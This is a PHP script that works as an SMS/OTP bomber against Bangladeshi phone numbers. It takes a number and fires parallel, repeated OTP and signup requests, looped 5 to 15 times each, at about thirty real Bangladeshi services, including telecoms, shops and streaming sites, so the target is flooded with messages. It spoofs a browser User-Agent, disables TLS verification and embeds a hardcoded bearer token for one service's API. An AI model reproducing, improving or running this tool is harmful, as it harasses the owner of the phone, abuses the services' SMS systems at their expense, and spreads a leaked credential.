<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0); 
set_time_limit(0); 

$phone = $_GET['phone'] ?? '';

if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
}

// ফোন ফরমেটিং
$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;

$phone_88 = "88" . $phone_11;             
$phone_plus88 = "+88" . $phone_11;        
$deepto_number = "+880" . substr($phone_11, -10); 
$phone_osudpotro = "+88-" . $phone_11;    
$phone_fundesh = substr($phone_11, 1);    

$api_requests = [];

// ==========================================
// 🔴 হাই-ভলিউম সার্ভিসেস (বেশি লুপ)
// ==========================================

// Shadhin Music (১৫ বার)
for($i=1;$i<=15;$i++) $api_requests[] = ["name"=>"shadhin_$i","url"=>"https://connect.shadhinmusic.com/v1/api//otp/send","method"=>"POST","data"=>["msisdn"=>$phone_88],"headers"=>['Content-Type:application/json','Origin:https://shadhinmusic.com']];

// RedX (১৫ বার)
for($i=1;$i<=15;$i++) $api_requests[] = ["name"=>"redx_$i","url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","method"=>"POST","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json','Origin:https://redx.com.bd']];

// Bikroy (১৫ বার)
for($i=1;$i<=15;$i++) $api_requests[] = ["name"=>"bikroy_$i","url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11","method"=>"GET"];

// PBS (১০ বার)
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"pbs_$i","url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP","method"=>"POST","data"=>["userPhone"=>$phone_11],"headers"=>['Content-Type:application/json','Origin:https://pbs.com.bd']];

// BDTickets (১০ বার)
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bdtickets_$i","url"=>"https://api.bdtickets.com/v1/auth","method"=>"POST","data"=>["phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],"headers"=>['Content-Type:application/json','Origin:https://bdtickets.com']];


// ==========================================
// 🟡 মিডিয়াম ভলিউম সার্ভিসেস (৫ বার করে)
// ==========================================
$medium_loops = [
    "shwapno" => ["url" => "https://www.shwapno.com/api/auth", "data" => ["phoneNumber"=>$phone_plus88]],
    "garibook" => ["url" => "https://api.garibookadmin.com/api/v4/user/login", "data" => ["mobile"=>$phone_plus88,"channel"=>"web"]],
    "deeptoplay" => ["url" => "https://api.deeptoplay.com/v2/auth/login?platform=web", "data" => ["number"=>$deepto_number]],
    "shomvob" => ["url" => "https://backend-api.shomvob.co/api/v2/otp/phone", "data" => ["phone"=>"88".$phone_11, "is_retry"=>0], "auth" => "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q"],
    "shikho" => ["url" => "https://api.shikho.com/auth/v2/send/sms", "data" => ["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"]]
];

foreach($medium_loops as $name => $info) {
    for($i=1; $i<=5; $i++) {
        $headers = ['Content-Type:application/json'];
        if(isset($info['auth'])) $headers[] = "Authorization: " . $info['auth'];
        $api_requests[] = ["name"=>$name."_$i", "url"=>$info['url'], "method"=>"POST", "data"=>$info['data'], "headers"=>$headers];
    }
}


// ==========================================
// 🔵 আপনার দেওয়া নতুন ১৪টি সার্ভিস (প্রতিটি ৫ বার লুপ)
// ==========================================
$new_services = [
    "chardike" => "https://api.chardike.com/api/otp/send",
    "bohubrihi" => "https://bb-api.bohubrihi.com/public/activity/otp",
    "ghoorilearning" => "https://api.ghoorilearning.com/api/auth/signup/otp",
    "rabbithole" => "https://apix.rabbitholebd.com/appv2/login/requestOTP",
    "airtel" => "https://api.bd.airtel.com/v1/account/login/otp",
    "eonbazar" => "https://app.eonbazar.com/api/auth/register",
    "ostad" => "https://api.ostad.app/api/v2/user/with-otp",
    "ieducation" => "https://www.ieducationbd.com/api/account/check_user",
    "prothomalo" => "https://prod-api.viewlift.com/identity/signup?site=prothomalo",
    "hoichoi" => "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
    "cokestudio" => "https://cokestudio23.sslwireless.com/api/store-and-send-otp",
    "grameenphone" => "https://weblogin.grameenphone.com/backend/api/v1/otp"
];

foreach($new_services as $name => $url) {
    for($i=1; $i<=5; $i++) {
        $data = ["phone" => $phone_11]; // Default data mapping
        if($name == "rabbithole" || $name == "prothomalo" || $name == "hoichoi") $data = ["requestType"=>"send", "phoneNumber"=>$phone_plus88];
        if($name == "cokestudio") $data = ["msisdn"=>$phone_88, "name"=>"TeamDCG"];
        if($name == "airtel") $data = ["phone_number"=>$phone_11];
        if($name == "ostad") $data = ["msisdn"=>$phone_11];
        if($name == "ghoorilearning") $data = ["mobile_no"=>$phone_11];
        if($name == "bohubrihi") $data = ["phone"=>$phone_11, "intent"=>"login"];
        if($name == "eonbazar") $data = ["mobile"=>$phone_11, "name"=>"TeamDCG"];
        if($name == "grameenphone") $data = ["msisdn"=>$phone_11];

        $api_requests[] = ["name"=>$name."_$i", "url"=>$url, "method"=>"POST", "data"=>$data, "headers"=>['Content-Type:application/json']];
    }
}

// স্পেশাল GET রিকোয়েস্ট (৫ বার করে)
for($i=1;$i<=5;$i++) {
    $api_requests[] = ["name"=>"rokomari_$i", "url"=>"https://www.rokomari.com/otp/send?emailOrPhone=".$phone_88."&countryCode=BD", "method"=>"GET"];
    $api_requests[] = ["name"=>"ecourier_$i", "url"=>"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=".$phone_11, "method"=>"GET"];
}


// ==========================================
// ⚡ Parallel Execution Engine
// ==========================================
$mh = curl_multi_init(); $handles = [];
foreach($api_requests as $key => $api){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15); // ফাস্ট রেসপন্সের জন্য টাইমআউট কমানো হয়েছে
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $headers = $api['headers'] ?? [];
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if(isset($api['method']) && $api['method'] === "GET"){
        curl_setopt($ch, CURLOPT_POST, false);
    } else {
        curl_setopt($ch, CURLOPT_POST, true);
        if(isset($api['data'])) curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data']));
    }
    $handles[$key] = $ch;
    curl_multi_add_handle($mh, $ch);
}

$running = null;
do { curl_multi_exec($mh, $running); curl_multi_select($mh); } while ($running > 0);

$final_results = [];
foreach($handles as $key => $ch){
    $final_results[$api_requests[$key]['name']] = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}
curl_multi_close($mh);

echo json_encode(["status" => "success", "total_hits" => count($api_requests), "results" => $final_results], JSON_PRETTY_PRINT);
?>
